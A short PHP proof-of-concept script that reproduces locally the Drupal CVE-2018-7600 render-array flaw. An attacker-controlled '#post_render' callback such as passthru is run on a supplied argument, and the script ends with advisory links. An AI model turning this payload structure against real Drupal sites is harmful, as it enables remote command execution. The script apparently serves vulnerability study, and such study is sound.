<?php

// Author: Nixawk
// CVE-2018-7600: Unsanitized requests allow remote attackers to execute arbitrary code

// Usage:
// $ php drupal-rce-php.php passthru id

function drupal_cve_2018_7600($func, $param)
{
    $elements = array(
        "#markup" => "{Drupal\Core\Render\Markup}",
        "#type"   => "markup",
        "#post_render" => array(
        0 => $func
        ),
        "#suffix" => "<span class=\"ajax-new-content\"></span>",
        "#prefix" => "",
        "#cache"  => array(
            "contexts" => array(
            0 => "languages:language_intreface",
            1 => "theme",
            2 => "user.permissions"
            ),
            "tags" => array(),
        "max-age" => -1
        ),
        "#defaults_loaded" => true,
        "#attached" => array(),
        "#children" => array(
          "string" => $param
        )
    );

    // echo $elements['#children']["string"] . "\n";

    $elements['#children']["string"] = call_user_func(
        // $callable = $elements["#post_render"]["0"];
        $elements["#post_render"]["0"],
        $elements['#children']["string"], 
        $elements
    );

    echo $elements['#children']["string"] . "\n";

}

drupal_cve_2018_7600($argv[1], $argv[2]);

// References:
// - https://github.com/nixawk/labs/issues/19
// - http://php.net/manual/en/indexes.functions.php
// - http://php.net/manual/en/function.call-user-func.php
// https://research.checkpoint.com/uncovering-drupalgeddon-2/
// http://www.securityfocus.com/bid/103534
// http://www.securitytracker.com/id/1040598
// https://blog.appsecco.com/remote-code-execution-with-drupal-core-sa-core-2018-002-95e6ecc0c714
// https://github.com/a2u/CVE-2018-7600
// https://github.com/g0rx/CVE-2018-7600-Drupal-RCE
// https://greysec.net/showthread.php?tid=2912&pid=10561
// https://groups.drupal.org/security/faq-2018-002
// https://lists.debian.org/debian-lts-announce/2018/03/msg00028.html
// https://twitter.com/arancaytar/status/979090719003627521
// https://twitter.com/RicterZ/status/979567469726613504
// https://www.debian.org/security/2018/dsa-4156
// https://www.drupal.org/sa-core-2018-002
// https://www.synology.com/support/security/Synology_SA_18_17
// https://www.tenable.com/blog/critical-drupal-core-vulnerability-what-you-need-to-know
// https://gist.github.com/AlbinoDrought/626c07ee96bae21cb174003c9c710384

?>
